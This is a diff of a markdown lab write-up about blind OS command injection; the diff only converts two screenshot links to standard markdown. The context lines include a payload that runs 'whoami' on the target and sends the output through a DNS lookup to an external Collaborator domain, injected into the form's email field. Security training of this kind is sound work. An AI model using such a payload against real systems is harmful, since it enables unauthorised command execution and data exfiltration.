@@ -7,6 +7,6 @@ Submitted a feedback and sent the request from *Proxy* to *Repeater*.
 I decided to inject a payload to perform a DNS lookup and output the contents of `whoami` to the *Collaborator* server. My payload is as such:
 `|| nslookup `whoami.`67bxhm1wtd0hs2mjsw8qghrfp6vxjn7c.oastify.com &`
 I URL encoded the payload and injected it at each client input, checking the polls in *Collaborator*:
-![[Screenshot 2024-05-09 at 1.26.38 PM.png]]
+![Screenshot 2024-05-09 at 1.26.38 PM](images/Screenshot%202024-05-09%20at%201.26.38%20PM.png)
 Injecting the payload at the `email` input triggered a DNS lookup as seen below, solving the lab!
-![[Screenshot 2024-05-09 at 1.28.03 PM.png]]
+![Screenshot 2024-05-09 at 1.28.03 PM](images/Screenshot%202024-05-09%20at%201.28.03%20PM.png)
